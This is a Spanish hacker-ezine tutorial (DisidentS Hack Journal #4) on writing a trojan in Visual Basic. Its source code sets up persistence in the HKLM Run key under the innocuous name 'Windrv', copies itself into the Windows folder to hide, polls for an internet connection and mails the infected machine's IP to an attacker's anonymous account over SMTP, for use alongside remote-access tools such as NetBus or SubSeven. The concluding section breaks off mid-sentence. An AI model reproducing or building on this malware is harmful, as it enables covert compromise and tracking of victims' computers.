---
title: "0X2"
ezine: "disidents"
---

# 0X2

**Ezine:** disidents

<div className="ascii-content">

```
                   -+-| DisidentS Hack Journal #4 |-+-





  _____________________________________________________________________________
 |                                                                             |
 | -- Titulo_____: Troyano en VB                                               |
 | -- Autor______: Meleth                                                      |
 | -- E-Mail_____: meleth_esp@yahoo.es                                         |
 | -- Team_______: Disidents Espa±a - http://www.disidents.org                 |
 | -- Tema_______: Artesania en visual basic                                   |
 |_____________________________________________________________________________|
                                                                                  
                                                                                    
                                                                                   
                                                                                  
.==============================================================================.
|===========~ INDICE ~==========================================================
|===============================================================================
|=~ 1.0 Introducci≤n                                                           | 
|=~ 2.0 Mandar correo                                                          | 
|=~ 3.0 Mandar correo con VB                                                   |
|=~ 4.0 Metiendonos en el registro                                             |
|=~ 5.0 Ver si estamos conectados                                              |
|=~ 6.0 Juntando todo                                                          |
|=~ 7.0 Conclusiones                                                           |
|=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=.
======================================================~ INDICE ~================
================================================================================
                                                                                     
                                                                                   
                                                                                    
.==============================================================================.
|=======~ 1.0 INTRODUCCION     ~================================================
|===============================================================================
                                                                                
 En este articulo vamos a desarrollar  un peque±o troyano cuyo unico objetivo es 
que todos aprendamos  los conceptos basicos y podamos empezar a desarrolar otros 
mas complicados.                                                                  
El troyano que vamos  a hacer tiene  una mision muy  sencilla, se ejecutara cada   
vez que arranque windows y  mirara cada 5 minutos si el ordenador esta conectado
a internet.                                                                      
Cuando el ordenador se conecte  nos mandara  la ip de ese ordenador a una cuenta 
anonima de correo y se cerrara hasta que windows vuelva a arrancar.              
Este  troyano  puede ser  usado  conjuntamente  con  el  netbus,  back oriffice,
subseven...  para  poder colarselo  a  alguien  que  tiene  conexion  por  modem 
telefonico que como ya sabreis cambia de ip cada vez que se conecta.               
Para poder  entenderlo  os recomiendo que  leais los articulos  de W3ndig0 sobre
sockets ya que vamos a usarlos constantemente.                                    
                                                                                  
                                                                                        
                                                                                         
.==============================================================================.       
|=======~ 2.0 MANDAR CORREO     ~===============================================
|===============================================================================
                                                                                        
 Nuestro troyano  mandara la ip  por correo a una cuenta que le hayamos indicado 
por lo tanto debemos aprender como mandar un correo desde visual basic.           
Tenemos  dos formas, la  facil y la dificil. La facil es llamar al outlook desde   
visual basic y mandar los mails desde alli. Es  la  que usan la  mayoria como el 
virus Melissa,etc... ya que mandan  un  mail a todos los que tengas en la agenda 
del outlook. La  dificil, que tampoco es muy dificil,  es conectarnos  al puerto
25 de un servidor de correo y mandar un mail desde alli.  La gran  desventaja de 
la  primera  es que  si el tio  no usa  outlook o  no lo tiene instalado nuestro 
troyano no funcionara asi que vamos a usar la segunda y asi aprendemos.
Si buscais por internet como mandar correo anonimo vereis un metodo que consiste
en hacer telnet al puerto 25 de un servidor.  Ese es el metodo  que vamos a usar
pero hay que tener  en cuenta  varias cosas. En internet vereis  que  el  metodo
es muy facil                                                                       
                                                                                   
C:\>telnet smtp.terramail.com.pe                                                     
                                                                                    
HELO yo@terra.com.pe                                                                    
MAIL FROM: campeon@cacaculopis.com                                                       
RCPT TO: yo@terra.es                                                                  
DATA                                                                                    
df                                                                                       
f                                                                                         
.                                                                                         
QUIT                                                                                        
                                                                                         
Haced la prueba.                                                                          
                                                                                         
 Con HELO yo indicamos  desde que  servidor estamos  mandando el correo, podemos 
poner cualquiera. MAIL FROM: campeon@cacaculopis.com indica quien es el remiten-
te del  mail, tambien  podemos poner  cualquiera.  RCPT TO: yo@terra.es indica a 
donde queremos mandar  el mail, este si que tiene que ser real porque es el des-
tinatario del mail. Con DATA escribimos el texto y cuando queramos acabar de es-
cribirlo escribimos un '.'.                                                        
Esta  es la teoria, hace a±os funcionaba muy bien, porque los servidores no eran
seguros pero ahora encontrar un servidor que te deje hacerlo  es casi imposible.
Lo que  ha  cambiado es que cuando te conectas a un servidor de correo solo pue-
des  mandar correo  a cuentas de  ese servidor, por ejemplo si quieres mandar un 
mail  a  kkkkk@terra.com.pe  tienes que conectarte  a  smtp.terramail.com.pe, si
quieres mandarlo a fffff@yahoo.es tienes que  conectarte a smtp.correo.yahoo.es.
Para  mandar correo a otro lado tenemos que autentificarnos y esto ya es mas di-
ficil.                                                                               
Pero para lo que a nosotros  nos  interesa nos  vale. Nosotros vamos a crear una
cuenta de  correo anonima, yo  la cree en terra peru, www.terra.com.pe y nuestro 
troyano se  va a conectar a ese servidor smtp.terramail.com.pe y nos va a mandar
a esa cuenta la ip del ordenador.                                                 
Por lo tanto la secuencia de comando que ejecutara sera:                              
                                                                                       
Abrir un socket al puerto 25 de smtp.terramail.com.pe                                      
                                                                                       
HELO yo                                                                                    
MAIL FROM: yo@terra.com.pe         --falsa                                               
RCPT TO: kkkkk@terramail.com.pe    --nuestra cuenta anonima donde                         
                                     recibiremos las ip                                      
DATA                                                                                                                 
123.34.23.223                      --aqui mandaremos la ip                               
                                     del ordenador "troyanizado"                                
.                                                                                         
QUIT                                                                                       
                                                                                             
                                                                                                        
.==============================================================================.                     
|=======~ 3.0 MANDAR CORREO CON VB    ~=========================================
|===============================================================================
                                                                                    
                                                                                    
 Ahora que ya sabemos mandar  correo  anonimo  vamos a ver como lo hacemos desde         
visual basic.                                                                        
                                                                                       
                                                                                     
Dim Response As String, Reply As Integer, DateNow As String                                        
Dim Start As Single, Tmr As Single                                                       
                                                                                        
Sub MandarMail(ByVal MailServerName As String, _                                             
               ByVal FromEmailAddress As String, _                                        
               ByVal ToEmailAddress As String, _                                         
               ByVal EmailBodyOfMessage As String)                                        
                                                                                                     
   'Se conecta al puerto 25 del servidor de correo y manda un mail                                        
                                                                                               
   Winsock1.LocalPort = 0                                                                                     
                                                                                             
If Winsock1.State = sckClosed Then                                                              
                                                                                                     
    Winsock1.Protocol = sckTCPProtocol                                                          
    Winsock1.RemoteHost = MailServerName                                                              
    Winsock1.RemotePort = 25                                                                       
    Winsock1.Connect                                                                               
                                                                                                  
    WaitFor ("220")                                                                              
                                                                                              
    Winsock1.SendData ("HELO yo" + vbCrLf)                                                         
                                                                                                
    WaitFor ("250")                                                                      
                                                                                   
    Winsock1.SendData ("mail from:" + Chr(32) + FromEmailAddress + vbCrLf)                            
                                                                                             
    WaitFor ("250")                                                                           
                                                                                             
    Winsock1.SendData ("rcpt to:" + Chr(32) + ToEmailAddress + vbCrLf)                         
                                                                                                  
    WaitFor ("250")                                                                       
                                                                                           
    Winsock1.SendData ("data" + vbCrLf)                                                            
                                                                                                     
    WaitFor ("354")                                                                            
                                                                                                        
    Winsock1.SendData (EmailBodyOfMessage + vbCrLf + vbCrLf)                                              
    Winsock1.SendData ("." + vbCrLf)                                                              
                                                                                                 
    WaitFor ("250")                                                                                         
                                                                                                                 
    Winsock1.SendData ("quit" + vbCrLf)                                                                       
                                                                                                           
    WaitFor ("221")                                                                                               
                                                                                                                    
    Winsock1.Close                                                                                                            
End If                                                                                                                
                                                                                                                                        
End Sub                                                                                                                     
                                                                                                                     
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)                                                                    
                                                                                                                                      
    Winsock1.GetData Response ' Check for incoming response *IMPORTANT*                                                               
                                                                                                                               
End Sub                                                                                                                        
                                                                                                                                   
                                                                                                                             
Sub WaitFor(ResponseCode As String)                                                                                     
    Start = Timer                                                                                                             
    While Len(Response) = 0                                                                                                    
        Tmr = Start - Timer                                                                                                           
        DoEvents                                                                                                                  
        If Tmr > 60 Then                                                                                             
            Exit Sub                                                                                                    
        End If                                                                                                       
    Wend                                                                                                          
    While Left(Response, 3) <> ResponseCode                                                                     
        DoEvents                                                                                                    
        If Tmr > 60 Then                                                                                             
            Exit Sub                                                                                              
        End If                                                                                                             
    Wend                                                                                                        
Response = ""                                                                                                     
End Sub                                                                                                       
                                                                                                                 
Esta es una funcion que encontre por internet y que he simplificado para que sea
mas facil de entender.                                                           
                                                                                  
Como veis es un subprograma al que le pasamos varios parametros, MailServerName,
FromEmailAddess, ToEmailAddress, EmailBodyOfMessage, cuyo nombre creo que es su-
ficientemente explicativo.                                                           
 Como veis lo primero es mirar  si el socket esta siendo usado, si no lo esta a-
brimos una conexion TCP al puerto  25 del servidor de  correo. Es importante  la 
funcion WaitFor. Cada vez que mandamos un comando al servidor este nos  devuelve
una respuesta que comienza por un codigo, 220 cuando se conecta,  250 cuando  el
comando se ha ejecutado con exito, 550 si es erroneo, 221 al salir.               
Con el comando WaitFor esperamos a que el servidor nos mande la cadena que espe-
ramos antes de mandar otro comando nuevo, si no los hicieramos mandariamos todos
los comandos seguidos y el servidor no los reconoceria. El  subprograma  WaitFor
tiene un timer, si pasa el tiempo sin que el servidor responda pasa del comando.
                                                                                  
.==============================================================================.
|=======~ 4.0 METIENDONOS EN EL REGISTRO     ~==================================
|===============================================================================
                                                                                  
                                                                                  
 Ya sabemos mandar mails con VB ahora necesitamos saber como podemos colarnos en
el registro y hacer que nuestro troyano se ejecute siempre al arrancar.            
La clave del registro que debemos modificar es:                                       
                                                                                       
HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run                    
                                                                                          
Aqui es donde estan todas los programas que se ejecutan al arrancar, ir a ejecu-
tar y escribir regedit, os aparecera el editor de registro y buscarlo.             
                                                                                   
La pregunta es ┐como lo modificamos?. Pues como ya hay gente que lo ha hecho  no
vamos a escribir nosotros la libreria otra vez.                                     
                                                                                        
Vamos a ver como se usa esta libreria. El codigo que vamos a usar es:                    
                                                                                               
  esta = QueryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Windrv")
  If esta = "" Then                                                                           
     SetKeyValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Windrv", dirwin+"\Windrv.exe", REG_SZ
    If (Dir(Trim(dirwin) + "\Windrv.exe") = "") Then                                       
     CopiaFichero "Windrv.exe", dirwin + "\Windrv.exe"                                       
    End If                                                                                    
  End If                                                                                  
                                                                                                                                                    
Nuestro programa le vamos a llamar Windrv que llama poco la atencion.                                            
Con QueryValue miramos si ya hemos escrito el registro antes, si no lo hemos he-
cho son SetKeyValue escribimos esa clave en el registro. Como veis es facil.                                 
Para ocultarlo lo copiamos al directorio donde esta windows.                                                     
Utilizamos dos funciones made in Meleth, copiaFichero y dirWin.                                     
CopiaFichero como su nombre indica copia un fichero, cosa que extra±amente VB no
hace, el codigo es este:                                                                       
                                                                                          
Sub CopiaFichero(ByVal FichOrigen As String, ByVal FichDestino As String)                          
                                                                                       
Dim Temp As Byte                                                                        
                                                                                              
On Error GoTo sigue                                                                       
                                                                                          
Open FichOrigen For Binary Access Read As #1                                            
                                                                                             
If (Dir(FichDestino) <> "") Then                                                         
 Kill FichDestino                                                                          
End If                                                                                     
Open FichDestino For Binary Access Write As #2                                                    
                                                                                               
While Not EOF(1)                                                                                     
  Get #1, , Temp                                                                                   
  Put #2, , Temp                                                                                     
Wend                                                                                                 
Close #1                                                                                                  
Close #2                                                                                                
sigue:                                                                                                    
                                                                                               
End Sub                                                                                                    
                                                                                                                               
 El  subprograma  dirwin  es  mas complicado y nos indica en que directorio esta
instalado windows.                                                                                                                       
                                                                                                     
Function dirwin() As String                                                                                     
                                                                                                              
'mira cual es el directorio de instalacion de windows                                                                            
'tambien puede servir para saber que windows se esta ejecutando                                                                     
                                                                                                     
dirwin = QueryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "SystemRoot")
                                                                                              
 If dirwin = "" Then                                                                                 
   'miro en win98                                                                                  
   dirwin = QueryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Else                                                                                                 
   GoTo fin                                                                                                     
 End If                                                                                                      
                                                                                                              
 'si no lo encuentra busco los directorios                                                                    
 If dirwin = "" Then                                                                                          
   If (Dir(Left(CurDir, 1) + ":\windows\notepad.exe") = "") Then                                              
     If (Dir(Left(CurDir, 1) + ":\winnt\notepad.exe") = "") Then                                                  
       dirwin = ""                                                                                             
     Else                                                                                                    
       GoTo fin                                                                                             
     End If                                                                                                     
   Else                                                                                                      
     dirwin = Left(CurDir, 1) + ":\Windows"                                                                  
   End If                                                                                                  
                                                                                                                
 Else                                                                                                      
     GoTo fin                                                                                                    
 End If                                                                                                              
                                                                                                                   
                                                                                                                        
fin:                                                                                                            
 dirwin = dirwin                                                                                                  
                                                                                                             
End Function                                                                                                          
                                                                                                                       
                                                                                                                     
 Cuando  estamos  en  Windows NT o XP el directorio de instalacion de Windows lo
podemos encontrar en:                                                                 
                                                                                        
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot           
                                                                                   
Si no esta ahi puede que estemos en Win 98 y buscaremos en:                            
                                                                                       
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SystemRoot                  
                                                                                   
Si no lo encontramos en ninguno de los dos buscamos en los directorios.                     
                                                                                  
 Este subprograma ademas de para saber donde esta windows nos puede servir  para
saber que sistema operativo usamos, si 98 o NT.                                
                                                                                              
                                                                                               
Meted este codigo en un modulo VB y ya podreis cambiar el registro.                      
                                                                                             
                                                                                        
'******************************************************************************         
'  ProgID:  Library.Registry                                                                    
' Purpose:  Wrapper for registry manipulation                                                  
'  Author:  John Powell (source freely available)                                         
'    Date:  04.12.2001                                                                     
' Changes:  none                                                                             
'------------------------------------------------------------------------------            
'   Usage:  CreateNewKey HKEY_CURRENT_USER, "TestKey\SubKey1\SubKey2"                            
'           SetKeyValue HKEY_CURRENT_USER, "TestKey\SubKey1", "Test", "Testing, Testing", REG_SZ
'           MsgBox QueryValue(HKEY_CURRENT_USER, "TestKey\SubKey1", "Test")                      
'           DeleteKey HKEY_CURRENT_USER, "TestKey\SubKey1\SubKey2"                                      
'           DeleteValue HKEY_CURRENT_USER, "TestKey\SubKey1", "Test"                                 
'******************************************************************************                     
                                                                                                    
Option Explicit                                                                                       
                                                                                                     
'******************************************************************************                           
' Class Variables                                                                               
'******************************************************************************                                      
                                                                                                
'Value Type                                                                                  
Public Enum regValueType                                                                      
    REG_SZ = 1                                                                                  
    REG_DWORD = 4                                                                                        
End Enum                                                                                                     
                                                                                                                
'Predefined Keys                                                                                                            
Public Enum regPredefinedKey                                                                                 
    HKEY_CLASSES_ROOT = &H80000000                                                                              
    HKEY_CURRENT_USER = &H80000001                                                                            
    HKEY_LOCAL_MACHINE = &H80000002                                                                     
    HKEY_USERS = &H80000003                                                                                   
End Enum                                                                                                
                                                                                                             
'Errors                                                                                                    
Public Enum regError                                                                                          
    ERROR_NONE = 0                                                                                              
    ERROR_BADDB = 1                                                                                              
    ERROR_BADKEY = 2                                                                                        
    ERROR_CANTOPEN = 3                                                                                                 
    ERROR_CANTREAD = 4                                                                                          
    ERROR_CANTWRITE = 5                                                                                    
    ERROR_OUTOFMEMORY = 6                                                                               
    ERROR_INVALID_PARAMETER = 7                                                                     
    ERROR_ACCESS_DENIED = 8                                                                           
    ERROR_INVALID_PARAMETERS = 87                                                               
    ERROR_NO_MORE_ITEMS = 259                                                                        
End Enum                                                                                         
                                                                                                
Const KEY_ALL_ACCESS As Long = &H3F                                                                        
                                                                                                             
Const REG_OPTION_NON_VOLATILE = 0                                                                             
                                                                                                                        
'API Declarations                                                                                                        
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long                                      
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueExString Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Private Declare Function RegQueryValueExLong Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Long, lpcbData As Long) As Long
Private Declare Function RegQueryValueExNULL Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As Long, lpcbData As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Private Declare Function RegDeleteKey& Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String)
Private Declare Function RegDeleteValue& Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String)
                                                                                                            
'******************************************************************************                                      
' Properties                                                                                               
'******************************************************************************                            
                                                                                                           
'******************************************************************************                          
' Public Methods                                                                                        
'******************************************************************************                         
                                                                                                       
'******************************************************************************                               
'    Name:  DeleteKey                                                                                   
'  Inputs:  Location As regPredefinedKey                                                                     
'           KeyName As String                                                                             
' Returns:  error code                                                                                    
'   Usage:  DeleteKey Location, KeyName                                                                  
'           Location must be HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_lOCAL_MACHINE                        
'           KeyName is name of the key you wish to delete, it may include subkeys (example "Key1\SubKey1")         
' Example:  DeleteKey HKEY_CURRENT_USER, "TestKey\SubKey1\SubKey2"                                            
'------------------------------------------------------------------------------                                     
' Purpose:  Deletes a key                                                                                             
'  Author:  John Powell                                                                                           
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Public Function DeleteKey(Location As regPredefinedKey, KeyName As String) As regError

    DeleteKey = RegDeleteKey(Location, KeyName)

End Function

'******************************************************************************
'    Name:  DeleteValue
'  Inputs:  Location As regPredefinedKey
'           KeyName As String
'           ValueName As String
' Returns:  error code
'   Usage:  DeleteValue Location, KeyName, ValueName
'           Location must equal HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_lOCAL_MACHINE
'           KeyName is name of the key that holds the value to delete, it may include subkeys (example "Key1\SubKey1")
'           ValueName is the name of value you wish to delete
' Example:  DeleteValue HKEY_CURRENT_USER, "TestKey\SubKey1", "Test"
'------------------------------------------------------------------------------
' Purpose:  Deletes a value
'  Author:  John Powell
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Public Function DeleteValue(Location As regPredefinedKey, KeyName As String, ValueName As String) As regError

    Dim lRetVal As Long      'Result of the SetValueEx function
    Dim hKey As Long         'Handle of open key

    'Attempt to open the key
    lRetVal = RegOpenKeyEx(Location, KeyName, 0, KEY_ALL_ACCESS, hKey)
       
    'If the key was opened, delete the value
    If lRetVal = ERROR_NONE Then
        
        'Delete the value
        lRetVal = RegDeleteValue(hKey, ValueName)
        
        'Close the key
        RegCloseKey (hKey)
        
    End If
       
    'Return the result
    DeleteValue = lRetVal
    
End Function

'******************************************************************************
'    Name:  CreateNewKey
'  Inputs:  Location As regPredefinedKey
'           KeyName As String
' Returns:  error code
'   Usage:  CreateNewKey Location, NewKeyName
'           Location must equal HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_lOCAL_MACHINE
'           KeyName is name of the key that holds the value to delete, it may include subkeys (example "Key1\SubKey1")
' Example:  CreateNewKey HKEY_CURRENT_USER, "TestKey\SubKey1\SubKey2"
'------------------------------------------------------------------------------
' Purpose:  Creates a new key
'  Author:  John Powell
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Public Function CreateNewKey(Location As regPredefinedKey, NewKeyName As String) As regError
    
    Dim hNewKey As Long         'Handle to the new key
    Dim lRetVal As Long         'Result of the RegCreateKeyEx function
    
    lRetVal = RegCreateKeyEx(Location, NewKeyName, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
    
    If lRetVal = ERROR_NONE Then
        RegCloseKey (hNewKey)
    End If
    
    'Return the result
    CreateNewKey = lRetVal
    
End Function

'******************************************************************************
'    Name:  SetKeyValue
'  Inputs:  Location As Long
'           KeyName As String
'           ValueName as String
'           ValueSetting As Variant
'           ValueType As regValueType
' Returns:  error code
'   Usage:  SetKeyValue Location, KeyName, ValueName, ValueSetting, ValueType
'           Location must equal HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_lOCAL_MACHINE
'           KeyName is name of the key that holds the value to delete, it may include subkeys (example "Key1\SubKey1")
'           ValueName is the name of the value you want create, or set the value of (example: "ValueTest")
'           ValueSetting is what you want the value set to
'           ValueType must equal either REG_SZ (a string) Or REG_DWORD (an integer)
' Example:  SetKeyValue HKEY_CURRENT_USER, "TestKey\SubKey1", "Test", "Testing, Testing", REG_SZ
'------------------------------------------------------------------------------
' Purpose:  Sets the data field of a value
'  Author:  John Powell
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Public Function SetKeyValue(Location As regPredefinedKey, KeyName As String, ValueName As String, ValueSetting As Variant, ValueType As regValueType) As regError

    Dim lRetVal As Long      'Result of the SetValueEx function
    Dim hKey As Long         'Handle of open key

    lRetVal = RegOpenKeyEx(Location, KeyName, 0, KEY_ALL_ACCESS, hKey)
    
    'If the key was opened, set the value
    If lRetVal = ERROR_NONE Then
        
        lRetVal = SetValueEx(hKey, ValueName, ValueType, ValueSetting)
        
        'Close the key
        RegCloseKey (hKey)
        
    End If
    
    'Return the result
    SetKeyValue = lRetVal
    
End Function

'******************************************************************************
'    Name:  QueryValue
'  Inputs:  Location As Long
'           KeyName As String
'           ValueName as String
' Returns:  Empty string if error | value at 'Location\KeyName\ValueName'
'   Usage:  QueryValue Location, KeyName, ValueName
'           Location must equal HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_lOCAL_MACHINE
'           KeyName is the key that the value is under (example: "Software\Microsoft\Windows\CurrentVersion\Explorer")
'           ValueName is the name of the value you want to access (example: "link")' Example:  Msgbox QueryValue(HKEY_CURRENT_USER, "TestKey\SubKey1", "Test")
'------------------------------------------------------------------------------
' Purpose:  Sets the data field of a value
'  Author:  John Powell
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Public Function QueryValue(Location As regPredefinedKey, KeyName As String, ValueName As String) As String

    Dim lRetVal As Long      'Result of the API functions
    Dim hKey As Long         'Handle of opened key
    Dim vValue As Variant    'Setting of queried value

    'Open the key
    lRetVal = RegOpenKeyEx(Location, KeyName, 0, KEY_ALL_ACCESS, hKey)
         
    'Query the value
    lRetVal = QueryValueEx(hKey, ValueName, vValue)
    
    'Return the value
    QueryValue = cleanProperty(vValue)
    
    'Close the key
    RegCloseKey (hKey)
               
End Function

'******************************************************************************
'    Name:  LightWeightEncrypt
'  Inputs:  Text As String
'           EncryptKey As Integer
' Returns:  Encrypted or decrypted string
'   Usage:  Encode: SecretPassword = LightWeightEncrypt(SecretPassword, 80)
'           DeCode: SecretPassword = LightWeightEncrypt(SecretPassword, 80)
'------------------------------------------------------------------------------
' Purpose:  Lightweight encryption of a string key
'           Useful for hiding values in the registry
'  Author:  John Powell
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Public Function LightWeightEncrypt(Text As String, EncryptKey As Integer) As String

    Dim Temp As String, RR As Integer
    
    For RR = 1 To Len(Text)
        Temp$ = Temp$ + Chr$(Asc(Mid(Text, RR, 1)) Xor EncryptKey)
    Next RR
    
    LightWeightEncrypt = Temp
    
End Function

'******************************************************************************
' Private Methods
'******************************************************************************

'******************************************************************************
'    Name:  SetValueEx
'  Inputs:  ByVal hKey As Long
'           ValueName As String
'           lType As Long
'           vValue As Variant
' Returns:  none
'------------------------------------------------------------------------------
' Purpose:  Set a value
'  Author:  John Powell
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Private Function SetValueEx(ByVal hKey As Long, ValueName As String, lType As Long, vValue As Variant) As Long
    
    Dim lValue As Long
    Dim sValue As String

    Select Case lType
        Case REG_SZ
            sValue = vValue
            SetValueEx = RegSetValueExString(hKey, ValueName, 0&, lType, sValue, Len(sValue))
        Case REG_DWORD
            lValue = vValue
            SetValueEx = RegSetValueExLong(hKey, ValueName, 0&, lType, lValue, 4)
        End Select

End Function

'******************************************************************************
'    Name:  QueryValueEx
'  Inputs:  lhKey As Long
'           szValueName
'           vValue As Variant
'           hKey As Long
' Returns:  none
'------------------------------------------------------------------------------
' Purpose:  Get a value
'  Author:  John Powell
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Private Function QueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, vValue As Variant) As Long
    
    Dim cch As Long
    Dim lrc As Long
    Dim lType As Long
    Dim lValue As Long
    Dim sValue As String

    On Error GoTo QueryValueExError

    ' Determine the size and type of data to be read
    lrc = RegQueryValueExNULL(lhKey, szValueName, 0&, lType, 0&, cch)
    If lrc <> ERROR_NONE Then Error 5

    Select Case lType
        ' For strings
        Case REG_SZ:
            sValue = String(cch, 0)
            lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)
            If lrc = ERROR_NONE Then
                vValue = Left$(sValue, cch)
            Else
                vValue = Empty
            End If

        ' For DWORDS
        Case REG_DWORD:
            lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)
            If lrc = ERROR_NONE Then vValue = lValue
        Case Else
            'all other data types not supported
            lrc = -1
    End Select

QueryValueExExit:

    QueryValueEx = lrc
    Exit Function

QueryValueExError:

    Resume QueryValueExExit

End Function

'******************************************************************************
'    Name:  cleanProperty
'  Inputs:  Property As String
' Returns:  A "cleaned" string
'------------------------------------------------------------------------------
' Purpose:  Chop of the last character because there is an end of string
'           character present when getting a string from the registry
'  Author:  John Powell
'    Date:  04.12.2001
' Changes:  none
'******************************************************************************
Private Function cleanProperty(ByVal Property As String) As String
   If Property <> "" Then
    cleanProperty = Left(Property, (Len(Property) - 1))
   Else
    cleanProperty = ""
   End If
End Function


.==============================================================================.
|=======~ 5.0 VER SI ESTAMOS CONECTADOS     ~===================================
|===============================================================================
                                                                                  
                                                                                   
 Para comprobar si estamos  conectados a  internet usaremos un metodo  muy facil    
intentaremos conectarnos al servidor de correo y si no lo conseguimos detectare-
mos el error y esperaremos 5 minutos antes de volver a intentarlo.

El codigo de comprueba es:

Sub comprueba()
  If Winsock2.State <> sckClosed Then Winsock2.Close
 
  Winsock2.Protocol = sckTCPProtocol
  Winsock2.RemotePort = 25
  Winsock2.RemoteHost = "smtp.terramail.com.pe"
  Winsock2.Connect
End Sub

Y la funcion que caza el error es:

Private Sub Winsock2_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
   ok = False
End Sub

Private Sub Winsock2_DataArrival(ByVal bytesTotal As Long)
   ok = True
End Sub

 Como veis si conectamos ponemos la variable global ok a true y si falla  la co-
nexion la ponemos a false                                                                

.==============================================================================.
|=======~ 6.0 JUNTANDO TODO     ~===============================================
|===============================================================================
                                                                                         
                                                                                   
Ya tenemos todas las partes que necesitamos.                                             
                                                                                     
 Crearemos un formulario con dos controles Winsock, winsock1  y  winsock2,  esto         
sera lo unico que tenga el codigo de form_load sera:                                  
                                                                                       
                                                                                        
Private Sub form_load()                                                                    
                                                                                         
  Winsock1.Close                                                                          
  Winsock2.Close                                                                      
  ok = False
  esta = QueryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Windrv")
  If esta = "" Then
     SetKeyValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Windrv", dirwin + "\Windrv.exe", REG_SZ
    If (Dir(Trim(dirwin) + "\Windrv.exe") = "") Then
     CopiaFichero "Windrv.exe", dirwin + "\Windrv.exe"
    End If
  End If
    
    
  comprueba
  
  Wait (5)
sigue:
  If ok = True Then
   
 '***************************************************
 '*  Aqui se ponen los datos del correo
 '***************************************************
 
     'Servidor de correo donde esta tu cuenta de correo
     MailServerName = "smtp.terramail.com.pe"
     'cualquier cuenta de origen
     FromEmailAddress = "yo@terra.com.pe"
     'tu direccion de correo en ese servidor de correo
     ToEmailAddress = "kkkkk@terramail.com.pe"
     
     EmailBodyOfMessage = Winsock1.LocalIP
 
     MandarMail MailServerName, FromEmailAddress, ToEmailAddress, EmailBodyOfMessage
     MsgBox ("Enviado")
     If Winsock2.State <> sckClosed Then Winsock2.Close
    
     End
  Else
     Wait 300  'si no estas conectado espera 5 minutos antes de volver a intertarlo
     comprueba
     Wait (5)
     GoTo sigue
  End If
   
End Sub

 La variable ok la declaras en un modulo donde pusiste las anteriores:

global ok as boolean
 
 Sirve para indicar si tenemos conexion a internet como ya habras visto.

El ultimo subprograma es el que espera unos segundos determinados:


Sub Wait(ByVal nSec As Integer)
    'Esperar un n·mero de segundos
    Dim t1 As Date, t2 As Date

    t1 = Second(Now)
    t2 = t1 + nSec
    Do
        DoEvents
    Loop While t2 > Second(Now)
End Sub

.==============================================================================.
|=======~ 7.0 CONCLUSIONES     ~================================================
|===============================================================================
                                                                                   
 Este troyano es muy simple, le faltan cosas como por ejemplo esconderse del ad-
